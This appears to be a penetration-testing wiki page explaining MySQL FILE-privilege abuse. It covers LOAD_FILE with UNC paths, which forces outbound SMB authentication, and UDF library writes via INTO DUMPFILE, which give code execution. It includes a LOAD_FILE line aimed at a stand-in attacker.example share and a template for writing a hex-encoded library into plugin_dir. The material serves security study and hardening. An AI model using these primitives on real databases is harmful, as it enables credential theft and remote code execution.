# MySQL `FILE` Privilege to Outbound SMB and RCE

{{#include ../../../banners/hacktricks-training.md}}

This page summarizes techniques for MySQL, MariaDB, and Percona Server described in the original SSRF/XSPA research and adds the relevant MySQL security constraints. Forks and versions can differ, so confirm their file-privilege, plugin-loading, and system-variable behavior on the exact target.<sup>[[1]](#references)</sup>

## UNC-path requests through `LOAD_FILE()`

`LOAD_FILE()` reads a file from the database server's host. It requires the MySQL `FILE` privilege, an absolute path, operating-system access for the `mysqld` account, and a path allowed by `secure_file_priv`.<sup>[[2]](#references)</sup>

`secure_file_priv` is platform- and build-dependent: a directory confines file operations to that directory, an empty value (`""`) imposes no path restriction, and `NULL` disables the relevant import/export operations. Do not assume `/var/lib/mysql-files/` is universal; query the live value:<sup>[[2]](#references)</sup>

```sql
SELECT @@global.secure_file_priv;
SELECT LOAD_FILE('C:\\Windows\\win.ini');
```

On Windows, a UNC path can make the host attempt SMB authentication to a remote server over TCP port 445. This is better described as an outbound SMB/credential-leak primitive than general-purpose SSRF: the destination port is not freely selectable, and the request is not arbitrary HTTP.<sup>[[1]](#references)</sup>

```sql
SELECT LOAD_FILE('\\\\attacker.example\\share\\file');
```

If the account running `mysqld` can authenticate to and read the remote share, `LOAD_FILE()` may return the remote file's bytes. Even when the file read fails, the SMB authentication attempt may still expose a challenge-response value to the listening server.<sup>[[1]](#references)</sup>

## Loadable-function path to code execution

MySQL loadable functions (historically called UDFs) execute native code from a shared library. A library registered with `CREATE FUNCTION ... SONAME` must reside in the directory identified by `plugin_dir` on supported MySQL versions.<sup>[[3]](#references)</sup>

The location rule is version-sensitive. MySQL 5.0.67 introduced `plugin_dir` for UDF loading: when it is nonempty, the library must be stored there; on older releases, or when that legacy variable is empty, the server searches directories known to the system's dynamic linker.<sup>[[7]](#references)</sup>

An SQL-injection path becomes code execution only if several independent conditions hold: the database account can write a compatible shared library, file writes can reach `@@plugin_dir`, the account can register the function, and the operating system permits `mysqld` to load it. MySQL explicitly warns that a writable plugin directory combined with the `FILE` privilege may allow executable code to be installed.<sup>[[4]](#references)</sup>

Where those prerequisites hold, the library bytes can be represented as a hexadecimal SQL literal and written without formatting by using `SELECT ... INTO DUMPFILE`. The destination must satisfy `secure_file_priv`, must not already exist, and is created under the operating-system account that runs `mysqld`.<sup>[[5]](#references)</sup>

```sql
SELECT 0x<hex-encoded-library> INTO DUMPFILE '<plugin_dir>/library_name.so';
```

```sql
SELECT @@plugin_dir, @@global.secure_file_priv;
SHOW GRANTS;
```

SQLMap supports custom UDF injection through `--udf-inject` and `--shared-lib`, but its result still depends on these database, filesystem, architecture, and operating-system prerequisites.<sup>[[6]](#references)</sup>

Libraries such as `lib_mysqludf_sys` expose operating-system command execution; an operator can also build a purpose-specific UDF that makes network requests. For blind injection, the original research discusses out-of-band recovery through UNC/SMB or DNS-capable primitives when the target operating system and network policy allow them.<sup>[[1]](#references)</sup>

## References

- [1] [Using SQL Injection to perform SSRF/XSPA attacks](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
- [2] [MySQL 8.0 Reference Manual - `secure_file_priv`](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv)
- [3] [MySQL 8.4 Reference Manual - `CREATE FUNCTION` Statement for Loadable Functions](https://dev.mysql.com/doc/refman/8.4/en/create-function-loadable.html)
- [4] [MySQL Reference Manual - Making MySQL Secure Against Attackers](https://dev.mysql.com/doc/refman/8.4/en/security-against-attack.html)
- [5] [MySQL 8.0 Reference Manual - `SELECT ... INTO DUMPFILE`](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [6] [sqlmap usage - User-defined function injection](https://github.com/sqlmapproject/sqlmap/wiki/usage#inject-custom-user-defined-functions-udf)
- [7] [MySQL 5.0 Release Notes - `plugin_dir` security enhancement in 5.0.67](https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/news.html)

{{#include ../../../banners/hacktricks-training.md}}
